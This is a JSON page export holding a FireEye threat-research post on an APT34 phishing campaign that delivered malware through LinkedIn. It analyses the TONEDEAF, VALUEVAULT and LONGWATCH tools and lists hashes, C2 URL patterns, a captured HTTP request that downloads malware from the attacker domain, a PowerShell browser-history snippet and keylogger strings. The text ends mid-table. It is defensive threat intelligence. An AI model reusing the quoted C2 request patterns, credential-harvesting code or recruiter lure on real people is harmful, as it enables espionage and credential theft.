{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Thu Jul 18 2019 11:04:56 GMT-0400",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Hard Pass: Declining APT34\u2019s Invite to Join Their Professional Network",
    "jcr:versionHistory": "807d8fb5-bed5-41f4-860e-bb86fdb7e0d4",
    "author": "Matt Bromiley",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "6910a554-daa0-4a5c-8e9e-9ceb74013528"
    ],
    "jcr:created": "Thu Nov 19 2020 18:55:16 GMT+0000",
    "cq:lastModified": "Thu Nov 19 2020 18:54:31 GMT+0000",
    "jcr:baseVersion": "6910a554-daa0-4a5c-8e9e-9ceb74013528",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:matt-bromiley",
      "fireeye-blog-authors:noah-klapprodt",
      "fireeye-blog-authors:nick-schroeder",
      "fireeye-blog-authors:jessica-rocchio",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:apt",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:iran",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:phishing"
    ],
    "jcr:uuid": "8ba81c75-06e0-4b70-abb7-ac66833e9d58",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Thu Jul 18 2019 11:00:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ch4\u003EBackground\u003C\/h4\u003E\n\u003Cp\u003EWith increasing geopolitical tensions in the Middle East, we expect Iran to significantly increase the volume and scope of its cyber espionage campaigns. Iran has a critical need for strategic intelligence and is likely to fill this gap by conducting espionage against decision makers and key organizations that may have information that furthers Iran\u0027s economic and national security goals. The identification of new malware and the creation of additional infrastructure to enable such campaigns highlights the increased tempo of these operations in support of Iranian interests.\u003C\/p\u003E\n\u003Ch4\u003EFireEye Identifies Phishing Campaign\u003C\/h4\u003E\n\u003Cp\u003EIn late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. Three key attributes caught our eye with this particular campaign:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003EMasquerading as a member of Cambridge University to gain victims\u2019 trust to open malicious documents,\u003C\/li\u003E\n\u003Cli\u003EThe usage of LinkedIn to deliver malicious documents,\u003C\/li\u003E\n\u003Cli\u003EThe addition of three new malware families to APT34\u2019s arsenal.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Cp\u003EFireEye\u2019s platform successfully thwarted this attempted intrusion, stopping a new malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified three new malware families and a reappearance of PICKPOCKET, malware exclusively observed in use by APT34. The new malware families, which we will examine later in this post, show APT34 relying on their PowerShell development capabilities, as well as trying their hand at Golang.\u003C\/p\u003E\n\u003Cp\u003EAPT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least 2014. They use a mix of public and non-public tools to collect strategic information that would benefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns with elements of activity reported as OilRig and Greenbug, by various security researchers. This threat group has conducted broad targeting across a variety of industries operating in the Middle East; however, we believe APT34\u0027s strongest interest is gaining access to financial, energy, and government entities.\u003C\/p\u003E\n\u003Cp\u003EAdditional research on APT34 can be found in this \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2017\/12\/targeted-attack-in-middle-east-by-apt34.html\u0022\u003EFireEye blog post\u003C\/a\u003E, this \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/blog-cert.opmd.fr\/dnspionage-focus-on-internal-actions\/\u0022\u003ECERT-OPMD post\u003C\/a\u003E, and this \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/blog.talosintelligence.com\/2018\/11\/dnspionage-campaign-targets-middle-east.html\u0022\u003ECisco post\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003EMandiant\u0026nbsp;\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.fireeye.com\/solutions\/managed-defense.html\u0022\u003EManaged Defense\u003C\/a\u003E also initiated a Community Protection Event (CPE) titled \u201cGeopolitical Spotlight: Iran.\u201d This CPE was created to ensure our customers are updated with new discoveries, activity and detection efforts related to this campaign, along with other recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in this\u0026nbsp;\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/12\/overruled-containing-a-potentially-destructive-adversary.html\u0022\u003Eupdated FireEye\u0026nbsp;blog post\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ch4\u003EIndustries Targeted\u003C\/h4\u003E\n\u003Cp\u003EThe activities observed by Managed Defense, and described in this post, were primarily targeting the following industries:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EEnergy and Utilities\u003C\/li\u003E\n\u003Cli\u003EGovernment\u003C\/li\u003E\n\u003Cli\u003EOil and Gas\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EUtilizing Cambridge University to Establish Trust\u003C\/h4\u003E\n\u003Cp\u003EOn June 19, 2019, Mandiant Managed Defense Security Operations Center received an exploit detection alert on one of our FireEye Endpoint Security appliances. The offending application was identified as Microsoft Excel and was stopped immediately by FireEye Endpoint Security\u2019s ExploitGuard engine. ExploitGuard is our behavioral monitoring, detection, and prevention capability that monitors application behavior, looking for various anomalies that threat actors use to subvert traditional detection mechanisms. Offending applications can subsequently be sandboxed or terminated, preventing an exploit from reaching its next programmed step.\u003C\/p\u003E\n\u003Cp\u003EThe Managed Defense SOC analyzed the alert and identified a malicious file named \u003Cspan class=\u0022code\u0022\u003ESystem.doc (MD5: b338baa673ac007d7af54075ea69660b)\u003C\/span\u003E, located in \u003Cspan class=\u0022code\u0022\u003EC:\\Users\\\u0026lt;user_name\u0026gt;\\.templates\u003C\/span\u003E. The file \u003Cspan class=\u0022code\u0022\u003ESystem.doc\u003C\/span\u003E is a Windows Portable Executable (PE), despite having a \u003Cspan class=\u0022code\u0022\u003E\u0026quot;doc\u0026quot;\u003C\/span\u003E\u0026nbsp;file extension. FireEye identified this new malware family as TONEDEAF.\u003C\/p\u003E\n\u003Cp\u003EA backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution. When executed, this variant of TONEDEAF wrote encrypted data to two temporary files \u2013 \u003Cspan class=\u0022code\u0022\u003Etemp.txt\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003Etemp2.txt\u003C\/span\u003E \u2013 within the same directory of its execution. We explore additional technical details of TONEDEAF in the malware appendix of this post.\u003C\/p\u003E\n\u003Cp\u003ERetracing the steps preceding exploit detection, FireEye identified that \u003Cspan class=\u0022code\u0022\u003ESystem.doc\u003C\/span\u003E was dropped by a file named \u003Cspan class=\u0022code\u0022\u003EERFT-Details.xls\u003C\/span\u003E. Combining endpoint- and network-visibility, we were able to correlate that \u003Cspan class=\u0022code\u0022\u003EERFT-Details.xls\u003C\/span\u003E originated from the URL \u003Cspan class=\u0022code\u0022\u003Ehttp:\/\/www.cam-research-ac[.]com\/Documents\/ERFT-Details.xls\u003C\/span\u003E. Network evidence also showed the access of a LinkedIn message directly preceding the spreadsheet download.\u003C\/p\u003E\n\u003Cp\u003EManaged Defense reached out to the impacted customer\u2019s security team, who confirmed the file was received via a LinkedIn message. The targeted employee conversed with \u0026quot;Rebecca Watts\u0026quot;, allegedly employed as \u0026quot;Research Staff at University of Cambridge\u0026quot;. The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for potential job opportunities.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/hardpass\/Picture1.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Screenshot of LinkedIn message asking to download TONEDEAF\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThis is not the first time we\u2019ve seen APT34 utilize academia and\/or job offer conversations in their various campaigns. These conversations often take place on social media platforms, which can be an effective delivery mechanism if a targeted organization is focusing heavily on e-mail defenses to prevent intrusions.\u003C\/p\u003E\n\u003Cp\u003EFireEye examined the original file \u003Cspan class=\u0022code\u0022\u003EERFT-Details.xls\u003C\/span\u003E, which was observed with at least two unique MD5 file hashes:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E96feed478c347d4b95a8224de26a1b2c\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ecaf418cbf6a9c4e93e79d4714d5d3b87\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EA snippet of the VBA code, provided in Figure 2, creates \u003Cspan class=\u0022code\u0022\u003ESystem.doc\u003C\/span\u003E in the target directory from base64-encoded text upon opening.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/hardpass\/Picture2.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Screenshot of VBA code from System.doc\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe spreadsheet also creates a scheduled task named \u003Cspan class=\u0022code\u0022\u003E\u0026quot;windows update check\u0026quot;\u003C\/span\u003E that runs the file \u003Cspan class=\u0022code\u0022\u003EC:\\Users\\\u0026lt;user_name\u0026gt;\\.templates\\System Manager.exe\u003C\/span\u003E every minute. Upon closing the spreadsheet, a final VBA function will rename \u003Cspan class=\u0022code\u0022\u003ESystem.doc\u003C\/span\u003E to \u003Cspan class=\u0022code\u0022\u003ESystem Manager.exe\u003C\/span\u003E. Figure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated to avoid simple detection.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/hardpass\/Picture3.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Additional VBA code from System.doc\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUpon first execution of TONEDEAF, FireEye identified a callback to the C2 server \u003Cspan class=\u0022code\u0022\u003Eofflineearthquake[.]com\u003C\/span\u003E over port 80.\u003C\/p\u003E\n\u003Ch4\u003EThe FireEye Footprint: Pivots and Victim Identification\u003C\/h4\u003E\n\u003Cp\u003EAfter identifying the usage of \u003Cspan class=\u0022code\u0022\u003Eofflineearthquake[.]com\u003C\/span\u003E as a potential C2 domain, FireEye\u2019s Intelligence and Advanced Practices teams performed a wider search across our global visibility. FireEye\u2019s Advanced Practices and Intelligence teams were able to identify additional artifacts and activity from the APT34 actors at other victim organizations. Of note, FireEye discovered two additional new malware families hosted at this domain, VALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May 2018, hosted on the C2.\u003C\/p\u003E\n\u003Cp\u003ERequests to the domain \u003Cspan class=\u0022code\u0022\u003Eofflineearthquake[.]com\u003C\/span\u003E could take multiple forms, depending on the malware\u2019s stage of installation and purpose. Additionally, during installation, the malware retrieves the system and current user names, which are used to create a three-character \u201csys_id\u201d. This value is used in subsequent requests, likely to track infected target activity. URLs were observed with the following structures:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxp[:\/\/]offlineearthquake[.]com\/download?id=\u0026lt;sys_id\u0026gt;\u0026amp;n=000\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxp[:\/\/]offlineearthquake[.]com\/upload?id=\u0026lt;sys_id\u0026gt;\u0026amp;n=000\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxp[:\/\/]offlineearthquake[.]com\/file\/\u0026lt;sys_id\u0026gt;\/\u0026lt;executable\u0026gt;?id=\u0026lt;cmd_id\u0026gt;\u0026amp;h=000\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Ehxxp[:\/\/]offlineearthquake[.]com\/file\/\u0026lt;sys_id\u0026gt;\/\u0026lt;executable\u0026gt;?id=\u0026lt;cmd_id\u0026gt;\u0026amp;n=000\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThe first executable identified by FireEye on the C2 was \u003Cspan class=\u0022code\u0022\u003EWinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a)\u003C\/span\u003E, identified by FireEye as LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a \u003Cspan class=\u0022code\u0022\u003Elog.txt\u003C\/span\u003E file in the Window\u2019s temp folder. Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post.\u003C\/p\u003E\n\u003Cp\u003EFireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4).\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET hxxp:\/\/offlineearthquake.com\/file\/\u0026lt;sys_id\u0026gt;\/b.exe?id=\u0026lt;3char_redacted\u0026gt;\u0026amp;n=000\u003Cbr\u003E\n User-Agent: Mozilla\/5.0 (Windows NT 6.1; Trident\/7.0; rv:11.0) \u003Cbr\u003E\n AppleWebKit\/537.36 (KHTML, like Gecko)\u003Cbr\u003E\n Host: offlineearthquake[.]com\u003Cbr\u003E\n Proxy-Connection: Keep-Alive Pragma: no-cache HTTP\/1.1\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security appliance\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFireEye identifies \u003Cspan class=\u0022code\u0022\u003Eb.exe (MD5: 9fff498b78d9498b33e08b892148135f)\u003C\/span\u003E as VALUEVAULT.\u003C\/p\u003E\n\u003Cp\u003EVALUEVAULT is a Golang compiled version of the \u0026quot;Windows Vault Password Dumper\u0026quot; browser credential theft tool from Massimiliano Montoro, the developer of Cain \u0026amp; Abel.\u003C\/p\u003E\n\u003Cp\u003EVALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. Further information regarding VALUEVAULT can be found in the appendix below.\u003C\/p\u003E\n\u003Cp\u003EFurther pivoting from FireEye appliances and internal data sources yielded two additional files, \u003Cspan class=\u0022code\u0022\u003EPE86.dll (MD5: d8abe843db508048b4d4db748f92a103)\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003EPE64.dll (MD5: 6eca9c2b7cf12c247032aae28419319e)\u003C\/span\u003E. These files were analyzed and determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively.\u003C\/p\u003E\n\u003Cp\u003EPICKPOCKET is a credential theft tool that dumps the user\u0027s website login credentials from Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a Mandiant incident response in 2018 and, to date, solely utilized by APT34.\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003EThe activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye\u2019s platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new \u003Ci\u003Eand\u003C\/i\u003E old malware.\u003C\/p\u003E\n\u003Cp\u003EWe suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security.\u003C\/p\u003E\n\u003Cp\u003ELearn more about \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/mandiant\/managed-detection-and-response.html\u0022\u003EMandiant Managed Defense\u003C\/a\u003E, and catch an on-demand recap on this and the \u003Ca href=\u0022https:\/\/www.brighttalk.com\/webcast\/10703\/445570\u0022\u003ETop 5 Managed Defense attacks\u003C\/a\u003E this year.\u003C\/p\u003E\n\u003Ch4\u003EMalware Appendix\u003C\/h4\u003E\n\u003Ch5\u003ETONEDEAF\u003C\/h5\u003E\n\u003Cp\u003ETONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/hardpass\/Picture5.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Snippet of code from TONEDEAF binary\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154.\u003C\/p\u003E\n\u003Ch5\u003EVALUEVAULT\u003C\/h5\u003E\n\u003Cp\u003EVALUEVAULT is a Golang compiled version of the \u201cWindows Vault Password Dumper\u201d browser credential theft tool from Massimiliano Montoro, the developer of Cain \u0026amp; Abel.\u003C\/p\u003E\n\u003Cp\u003EVALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Epowershell.exe \/c \u0026quot;function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Object -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EUpon execution, VALUEVAULT creates a SQLITE database file in the \u003Cspan class=\u0022code\u0022\u003EAppData\\Roaming\u003C\/span\u003E directory under the context of the user account it was executed by. This file is named \u003Cspan class=\u0022code\u0022\u003Efsociety.dat\u003C\/span\u003E and VALUEVAULT will write the dumped passwords to this in SQL format. This functionality is not in the original version of the \u201cWindows Vault Password Dumper\u201d. Figure 7 shows the SQL format of the \u003Cspan class=\u0022code\u0022\u003Efsociety.dat\u003C\/span\u003E file.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/hardpass\/Picture7.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EVALUEVAULT\u2019s function names are not obfuscated and are directly reviewable in strings analysis. Other developer environment variables were directly available within the binary as shown below. VALUEVAULT does not possess the ability to perform network communication, meaning the operators would need to manually retrieve the captured output of the tool.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EC:\/Users\/\u0026lt;redacted\u0026gt;\/Desktop\/projects\/go\/src\/browsers-password-cracker\/new_edge.go\u003Cbr\u003E\n C:\/Users\/\u0026lt;redacted\u0026gt;\/Desktop\/projects\/go\/src\/browsers-password-cracker\/mozila.go\u003Cbr\u003E\n C:\/Users\/\u0026lt;redacted\u0026gt;\/Desktop\/projects\/go\/src\/browsers-password-cracker\/main.go\u003Cbr\u003E\n C:\/Users\/\u0026lt;redacted\u0026gt;\/Desktop\/projects\/go\/src\/browsers-password-cracker\/ie.go\u003Cbr\u003E\n C:\/Users\/\u0026lt;redacted\u0026gt;\/Desktop\/projects\/go\/src\/browsers-password-cracker\/Chrome Password Recovery.go\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Golang files extracted during execution of VALUEVAULT\u003C\/span\u003E\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ch5\u003ELONGWATCH\u003C\/h5\u003E\n\u003Cp\u003EFireEye identified the binary \u003Cspan class=\u0022code\u0022\u003EWinNTProgram.exe (MD5:021a0f57fe09116a43c27e5133a57a0a)\u003C\/span\u003E hosted on the malicious domain \u003Cspan class=\u0022code\u0022\u003Eofflineearthquake[.]com\u003C\/span\u003E. FireEye identifies this malware as LONGWATCH. The primary function of LONGWATCH is a keylogger that outputs keystrokes to a \u003Cspan class=\u0022code\u0022\u003Elog.txt\u003C\/span\u003E file in the Windows temp folder.\u003C\/p\u003E\n\u003Cp\u003EInteresting strings identified in the binary are shown in Figure 9.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022624\u0022 valign=\u0022top\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGetAsyncKeyState\u003Cbr\u003E\n \u0026gt;---------------------------------------------------\\n\\n\u003Cbr\u003E\n c:\\\\windows\\\\temp\\\\log.txt\u003Cbr\u003E\n [ENTER]\u003Cbr\u003E\n [CapsLock]\u003Cbr\u003E\n [CRTL]\u003Cbr\u003E\n [PAGE_UP]\u003Cbr\u003E\n [PAGE_DOWN]\u003Cbr\u003E\n [HOME]\u003Cbr\u003E\n [LEFT]\u003Cbr\u003E\n [RIGHT]\u003Cbr\u003E\n [DOWN]\u003Cbr\u003E\n [PRINT]\u003Cbr\u003E\n [PRINT SCREEN] (1 space)\u003Cbr\u003E\n [INSERT]\u003Cbr\u003E\n [SLEEP]\u003Cbr\u003E\n [PAUSE]\u003Cbr\u003E\n \\n---------------CLIPBOARD------------\\n\u003Cbr\u003E\n \\n\\n \u0026gt;\u0026gt;\u0026gt;\u0026nbsp; (2 spaces)\u003Cbr\u003E\n c:\\\\windows\\\\temp\\\\log.txt\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Strings identified in a LONGWATCH binary\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EDetecting the Techniques\u003C\/h5\u003E\n\u003Cp\u003EFireEye detects this activity across our platforms, including named detection for TONEDEAF, VALUEVAULT, and LONGWATCH. \u003Ci\u003ETable 2\u003C\/i\u003E contains several specific detection names that provide an indication of APT34 activity.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022380\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ESignature Name\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Keylogger_Win_LONGWATCH_1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Keylogger_Win_LONGWATCH_2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Keylogger_Win32_LONGWATCH_1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_HackTool_Win_PICKPOCKET_1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Trojan_Win32_VALUEVAULT_1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFE_APT_Backdoor_Win32_TONEDEAF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF BACKDOOR [DNS]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF BACKDOOR [upload]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022380\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF BACKDOOR [URI]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: FireEye Platform Detections\u003C\/span\u003E\u003Ci\u003E\u003C\/i\u003E\u003C\/p\u003E\n\u003Ch5\u003EEndpoint Indicators\u003C\/h5\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022100%\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EIndicator\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EMD5 Hash (if applicable)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ECode Family \u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESystem.doc\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Eb338baa673ac007d7af54075ea69660b\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETONEDEAF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002228%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241%\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E50fb09d53c856dcd0782e1470eaeae35\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002229%\u0022 